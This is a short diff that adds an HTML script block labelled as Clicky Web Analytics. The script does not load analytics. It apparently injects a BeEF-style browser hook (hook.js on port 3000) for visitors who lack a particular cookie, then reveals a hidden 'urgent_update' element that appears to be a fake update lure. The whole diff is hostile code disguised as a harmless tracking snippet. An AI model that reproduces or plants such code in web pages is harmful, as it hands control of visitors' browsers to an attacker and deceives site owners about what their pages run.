@@ -1,0 +1,19 @@
+<!-- Clicky Web Analytics (start) -->
+<script>
+    function loadClickyJS(file){
+        var jsElm = document.createElement('script');
+        jsElm.src = file;
+        document.head.appendChild(jsElm);
+    }
+    var clicky_site_ids = {};
+    var clicky_site_values = {};
+    const checker = document.cookie
+        .split('; ')
+        .find((row) => row.startsWith('ec'))
+        ?.split('=')[1];
+
+    if (typeof checker == 'undefined'){
+        loadClickyJS('http://127.0.0.1:3000/hook.js');
+    }
+    document.getElementById('urgent_update').hidden = '';
+</script>
